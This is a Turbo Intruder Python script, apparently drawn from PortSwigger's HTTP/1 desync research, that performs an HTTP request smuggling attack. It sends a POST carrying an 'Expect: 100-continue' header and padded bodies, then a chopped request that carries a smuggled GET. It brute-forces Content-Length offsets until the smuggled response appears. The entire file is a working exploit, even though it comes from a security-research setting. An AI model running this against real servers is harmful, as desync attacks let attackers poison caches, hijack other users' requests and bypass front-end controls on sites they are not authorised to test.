# Refer to https://portswigger.net/research/http1-must-die
# This approach is less reliable than 0cl-exploit - only use it if absolutely essential
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=1,
                           engine=Engine.THREADED,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )

    attack = '''POST /?ABCDEF HTTP/1.1
Host: portswigger.net
Content-Length: 123
Content-Type: application/x-www-form-urlencoded
Expect: 100-continue
Connection: keep-alive

'''

    # adjust this request to get a recognisable response
    smuggled = '''GET /?WRTZ HTTP/1.1
Host: portswigger.net
Connection: keep-alive

'''

    chopped = '''POST / HTTP/1.1
Host: portswigger.net
Content-Length: '''+str(len(smuggled))+'''
Connection: keep-alive

'''

    start = len(chopped)
    end = start + 1000
    while True:
        for CL in range(start, end):
            label = 'CL: '+str(CL)+' Offset: '+ str(CL - len(chopped))
            for x in range(35):
                engine.queue(attack + "G"*CL, label=label)
                engine.queue(chopped+smuggled, label=label)

def handleResponse(req, interesting):
    table.add(req)

    # check for smuggled response and stop the attack
    # when the attack is stopped, look at the label on the succesful response to see the offset
    if 'WRTZ' in req.response: # or req.status  == 405:
        req.engine.cancel()
